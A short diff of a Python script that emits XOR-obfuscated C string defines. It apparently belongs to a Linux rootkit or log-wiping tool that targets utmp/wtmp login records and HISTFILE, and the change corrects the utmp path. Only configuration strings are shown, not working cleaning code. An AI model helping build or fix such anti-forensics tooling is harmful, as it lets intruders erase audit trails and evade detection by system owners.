@@ -100,7 +100,7 @@ print '''
 #define UTMP_MSG "''' + xor("utmp logs cleaned up.") + '''"
 #define WTMP_MSG "''' + xor("wtmp logs cleaned up.") + '''"
 
-#define UTMP_FILE_X "''' + xor("/var/log/utmp") + '''"
+#define UTMP_FILE_X "''' + xor("/var/run/utmp") + '''"
 #define WTMP_FILE_X "''' + xor("/var/log/wtmp") + '''"
 
 #define HISTFILE "''' + xor("HISTFILE") + '''"
